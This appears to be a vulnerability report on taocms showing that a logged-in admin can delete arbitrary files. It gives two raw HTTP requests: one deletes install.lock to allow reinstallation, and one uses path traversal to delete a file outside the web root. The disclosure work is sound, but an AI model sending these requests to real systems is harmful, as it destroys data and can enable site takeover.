## taocms arbitrary file deletion vulnerability

### attack condition: Requires login management
 
1. open taocms/include/Model/File.php, found delete file code. The requested url is `admin.php?action=file&ctrl=del&path=`
  
![image](https://user-images.githubusercontent.com/39737245/179341807-abf00881-056b-44b8-9bea-488f3b575131.png)

2. When taocms is installed, the install.lock file will be generated in the data directory

![image](https://user-images.githubusercontent.com/39737245/179341924-316ea8c6-83c1-4a72-8d85-5c5fd3a16fbb.png)

3. At this point, when I visit install.php, it reminds me that it is already installed

![image](https://user-images.githubusercontent.com/39737245/179342073-215bee64-5d34-428a-8f4f-5a5a506605d8.png)

4. As requested below, I want to delete the install.lock file

```
GET /admin/admin.php?action=file&ctrl=del&path=/data/install.lock HTTP/1.1
Host: 127.0.0.1:9999
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://127.0.0.1:9999/admin/admin.php?action=file&ctrl=lists
Cookie: PHPSESSID=tnbrlgg1g539t0mjovqs1vrgio
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: frame
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

5. Surprisingly it can be removed successfully

![image](https://user-images.githubusercontent.com/39737245/179342236-1c55b3bb-22a0-4ab2-9b37-6c90a9143003.png)

6. I visit install.php again, glad, taocms allows reinstallation

![image](https://user-images.githubusercontent.com/39737245/179342306-39cc40e9-fa11-4a69-adf4-a7e1a985b553.png)

7. Also, create a new test.txt file in your own user directory

![image](https://user-images.githubusercontent.com/39737245/179346251-f06f5e25-657b-4092-bc05-caa80a3dfc8f.png)

8. When I execute delete payloadï¼Œtest.txt is deleted

```
GET /admin/admin.php?action=file&ctrl=del&path=/../../../test.txt HTTP/1.1
Host: 127.0.0.1:9999
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://127.0.0.1:9999/admin/admin.php?action=file&ctrl=lists
Cookie: PHPSESSID=tnbrlgg1g539t0mjovqs1vrgio
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: frame
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```
![image](https://user-images.githubusercontent.com/39737245/179346452-79df5849-92b3-4236-9083-6e39fabdadc8.png)

